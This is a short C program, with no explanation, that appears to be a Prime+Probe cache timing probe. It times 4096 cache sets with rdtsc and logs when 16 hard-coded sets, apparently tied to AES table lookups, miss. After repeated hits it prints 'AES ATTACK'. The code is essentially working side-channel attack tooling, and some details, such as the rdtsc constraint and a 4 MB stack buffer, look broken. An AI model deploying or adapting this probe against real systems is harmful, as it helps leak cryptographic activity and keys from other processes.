#include<stdio.h>
#include<time.h>
#include<omp.h>
#include<math.h>
#include<stdlib.h>
#include<string.h>

static __inline__ unsigned long long rdtsc(void)
{
  unsigned long long int x;
     __asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
     return x;
}

int main(int argc, char **argv)

{
	FILE *fp=fopen(argv[1],"w+");
        char a[4194305];
	char buff[100];
        int i,j,k,count,l,increment=0,h=0;
        double start,end;
	int flag=0,num=0;

        for(i=0;i<4194305;i++)
                a[i]='a';

	while(1)
	{
		flag=0;
		for(l=0;l<4096;l++)
		{ 
			i=l*64;
        		//to cover all 8 lines of set1
			unsigned long long cycles = rdtsc();
        		for(j=0;j<16;j++)
        		{ 
				count=0;
		                //read cache line
				//unsigned long long cycles = rdtsc();
		                while(count<64)
		                {
		                        k=a[i];
		                        //to skip remaining sets
                		        count++;
		                        i++;
                		}
				//cycles = rdtsc() - cycles;

                		increment=4095*64;
		                i=i+increment;
			}

			 cycles = rdtsc() - cycles;

			if(cycles>8000)
			{
         		   if(l==283||l==267||l==262||l==268||l==313||l==314||l==299||l==296||l==324||l==328||l==326||l==354||l==359||l==362||l==369||l==363)
			   {
				fprintf(fp,"%d\t",l);
				time_t now=time(NULL);
				strftime(buff,100,"%H:%M:%S.000",localtime(&now));
				fprintf(fp,"%s\t\t",buff);
				flag++;
			   }
			}
		}//for loop of l
		fprintf(fp,"\n %d",flag);
		fprintf(fp,"\n---------------------------\n");
		if(flag==16)
		{	
			if(num<3)
				num++;
			else
			{
				sleep(2);
				printf("AES ATTACK");
				break;
			}
		}
	}//closing while loop
}
